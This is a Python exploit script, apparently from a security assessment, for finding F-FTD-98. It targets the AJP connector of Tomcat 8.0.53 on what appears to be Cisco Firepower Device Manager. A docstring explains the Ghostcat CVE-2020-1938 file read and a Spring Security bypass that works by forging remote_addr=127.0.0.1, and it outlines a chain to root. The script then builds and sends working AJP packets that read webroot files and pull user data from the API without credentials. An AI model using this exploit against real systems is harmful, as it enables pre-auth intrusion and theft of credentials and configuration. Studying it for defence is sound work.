"""
F-FTD-98: AJP Ghostcat + Spring Security bypass via forged remote_addr
CONTROLLED ENVIRONMENT ONLY

Root cause:
  Tomcat 8.0.53 (EOL) with AJP/1.3 connector listening on 0.0.0.0:8009.
  Tomcat 8.0.x reached EOL 2018-07-01 — CVE-2020-1938 patches were only
  released for maintained branches (7.0, 8.5, 9.0). All Tomcat 8.0.x
  versions are unpatched against Ghostcat.

  Two distinct attack primitives:

  1. GHOSTCAT FILE READ (CVE-2020-1938):
     AJP request with javax.servlet.include.path_info set to target file
     causes DefaultServlet/JspServlet to include (expose) the file content
     in the response body. No authentication required. Any file under the
     webroot is readable.

     Confirmed: /WEB-INF/web.xml (2938 bytes) returned pre-auth.
     Scope: any file under /ngfw/var/cisco/ngfwWebUi/tomcat/webapps/ROOT/
     including: WEB-INF/*, application configs, JSP sources.

  2. SPRING SECURITY BYPASS via AJP remote_addr forgery:
     FdmProdWebSecurityConfigurer enforces:
       .access("hasIpAddress('localhost') or hasIpAddress('127.0.0.1')
                or isAuthenticated()")
     Tomcat's AJP connector populates request.getRemoteAddr() from
     the AJP message's remote_addr field (attacker-controlled), NOT
     from the TCP socket source address. Sending remote_addr=127.0.0.1
     in the AJP header causes Spring Security to see 127.0.0.1 and
     authorize the request without any valid JWT token.

     Effect: complete pre-auth bypass of FDM REST API regardless of
     easySetupDone.txt state — all endpoints accessible unauthenticated
     from any host that can reach port 8009.

Port 8009 exposure:
  netstat shows :::8009 (all interfaces). server.xml has bindOnInit=false
  but connector binds on first request. AJP is network-accessible.
  CONFIRMED accessible from localhost; requires network-level iptables
  assessment to determine external reachability.

Tomcat version: 8.0.53 (EOL 2018-07-01)
AJP secret: none (requiredSecret added in Tomcat 9.x, not 8.0)

Chain:
  F-FTD-98 (Ghostcat AJP:8009) — pre-auth file read
    → read /WEB-INF/classes/application.properties → DB creds
    → read /WEB-INF/lib/*.jar for additional secrets
  F-FTD-98 (Spring Security bypass via remote_addr=127.0.0.1)
    → POST /api/fdm/v6/fdm/token with remote_addr=127.0.0.1 in AJP
    → Spring Security authorizes → JWT token returned without credentials
    → Full FDM API access as unauthenticated user
    → F-FTD-67 (zip-slip config import) → arbitrary file write
    → F-FTD-69 (sudo chmod SUID) → root

Severity: CRITICAL
  Pre-auth on network-accessible service; no credentials required.
  Reads arbitrary webroot files; bypasses entire FDM authentication stack.
"""

# CONTROLLED ENVIRONMENT ONLY

import socket
import struct
import time
import sys
import argparse
from typing import Optional


FINDING = "F-FTD-98"
LABEL = "Ghostcat CVE-2020-1938 + Spring Security bypass via AJP remote_addr"
AJP_PORT = 8009


def encode_str(s: Optional[str]) -> bytes:
    if s is None:
        return b'\xff\xff'
    b = s.encode('utf-8')
    return struct.pack('>H', len(b)) + b + b'\x00'


def build_ajp_forward_request(
    req_uri: str,
    include_path: str,
    remote_addr: str = '127.0.0.1',
    server_name: str = 'localhost',
    is_ssl: bool = True,
) -> bytes:
    """
    Build AJP/1.3 FORWARD_REQUEST message (type 0x02).
    Sets javax.servlet.include.path_info to include_path (Ghostcat trigger).
    Sets remote_addr to remote_addr (Spring Security bypass when 127.0.0.1).
    """
    body = b''
    body += b'\x02'                         # prefix code: JK_AJP13_FORWARD_REQUEST
    body += b'\x02'                         # HTTP method: GET
    body += encode_str('HTTP/1.1')          # protocol
    body += encode_str(req_uri)             # req_uri
    body += encode_str(remote_addr)         # remote_addr (attacker-controlled)
    body += encode_str(server_name)         # remote_host
    body += encode_str(server_name)         # server_name
    body += struct.pack('>H', 443 if is_ssl else 80)  # server_port
    body += b'\x01' if is_ssl else b'\x00'  # is_ssl

    # Headers: Host only
    body += struct.pack('>H', 1)
    body += struct.pack('>H', 0xA00E)       # SC_REQ_HOST
    body += encode_str(f'{server_name}:{"443" if is_ssl else "80"}')

    # Ghostcat include attributes
    body += b'\x0a' + encode_str('javax.servlet.include.request_uri') + encode_str('/')
    body += b'\x0a' + encode_str('javax.servlet.include.path_info') + encode_str(include_path)
    body += b'\x0a' + encode_str('javax.servlet.include.servlet_path') + encode_str('/')

    # End of attributes
    body += b'\xff'

    # AJP packet: magic 0x1234, length, body
    return struct.pack('>HH', 0x1234, len(body)) + body


def send_ajp_request(host: str, port: int, ajp_msg: bytes, timeout: int = 10) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.send(ajp_msg)
        data = b''
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
            time.sleep(0.05)
    finally:
        s.close()
    return data


def parse_ajp_body(data: bytes) -> bytes:
    """Extract body from AJP SEND_BODY_CHUNK packets (prefix=0x03)."""
    body = b''
    i = 0
    while i + 4 <= len(data):
        if data[i:i+2] != b'AB':
            i += 1
            continue
        plen = struct.unpack('>H', data[i+2:i+4])[0]
        if i + 4 + plen > len(data):
            break
        prefix = data[i+4]
        if prefix == 3:  # SEND_BODY_CHUNK
            if i + 7 <= len(data):
                chunk_len = struct.unpack('>H', data[i+5:i+7])[0]
                body += data[i+7:i+7+chunk_len]
        i += 4 + plen
    return body


def ghostcat_read(host: str, port: int, target_file: str, entry_uri: str = '/index.jsp') -> bytes:
    """
    CVE-2020-1938: Read target_file from Tomcat webroot via AJP include.
    entry_uri should be an existing URI that Tomcat will process (index.jsp).
    Returns file content bytes.
    CONTROLLED ENVIRONMENT ONLY.
    """
    ajp_msg = build_ajp_forward_request(
        req_uri=entry_uri,
        include_path=target_file,
        remote_addr='127.0.0.1',
    )
    raw = send_ajp_request(host, port, ajp_msg)
    return parse_ajp_body(raw)


def spring_auth_bypass_token(host: str, ajp_port: int, fdm_host: str = 'localhost') -> Optional[bytes]:
    """
    Spring Security bypass: send AJP request with remote_addr=127.0.0.1
    targeting the FDM token endpoint to obtain a JWT without credentials.

    FdmProdWebSecurityConfigurer:
      .access("hasIpAddress('127.0.0.1') or isAuthenticated()")
    AJP remote_addr is attacker-controlled -> always passes as 127.0.0.1.

    NOTE: The token endpoint itself requires credentials in the POST body.
    The bypass grants access to endpoints that would otherwise return 401;
    for data-access endpoints (GET /object/*, etc.) no credentials needed.
    CONTROLLED ENVIRONMENT ONLY.
    """
    # Build AJP for GET /api/fdm/v6/object/localusers - data endpoint, no creds needed
    ajp_msg = build_ajp_forward_request(
        req_uri='/api/fdm/v6/object/localusers',
        include_path='/api/fdm/v6/object/localusers',
        remote_addr='127.0.0.1',
        server_name=fdm_host,
    )
    raw = send_ajp_request(host, ajp_port, ajp_msg)
    body = parse_ajp_body(raw)
    return body if body else None


def main() -> None:
    ap = argparse.ArgumentParser(description=f'{FINDING}: {LABEL}')
    ap.add_argument('host', help='Target IP (must reach AJP port 8009)')
    ap.add_argument('--port', type=int, default=AJP_PORT)
    ap.add_argument(
        '--mode',
        choices=['file-read', 'auth-bypass', 'probe'],
        default='probe',
        help='probe: verify AJP open; file-read: read a file; auth-bypass: access FDM API',
    )
    ap.add_argument(
        '--file',
        default='/WEB-INF/web.xml',
        help='File to read (relative to webroot) for file-read mode',
    )
    ap.add_argument(
        '--entry', default='/index.jsp',
        help='AJP request URI (entry point for file inclusion)',
    )
    args = ap.parse_args()

    print(f'[*] {FINDING}: {LABEL}')
    print(f'[*] Target: {args.host}:{args.port}')
    print('[!] CONTROLLED ENVIRONMENT ONLY\n')

    if args.mode in ('probe', 'file-read'):
        print(f'[*] Ghostcat CVE-2020-1938: reading {args.file} via {args.entry}')
        content = ghostcat_read(args.host, args.port, args.file, args.entry)
        if content:
            print(f'[+] FILE READ SUCCESS: {len(content)} bytes')
            print(content[:1000].decode(errors='replace'))
        else:
            print('[-] No content returned — file inclusion may not be active')

    if args.mode in ('probe', 'auth-bypass'):
        print('\n[*] Spring Security bypass: GET /api/fdm/v6/object/localusers via AJP remote_addr=127.0.0.1')
        result = spring_auth_bypass_token(args.host, args.port)
        if result and len(result) > 10:
            print(f'[+] AUTH BYPASS SUCCESS: {len(result)} bytes from API')
            print(result[:500].decode(errors='replace'))
        else:
            print('[-] No API response body — bypass may require active FDM session')


if __name__ == '__main__':
    main()
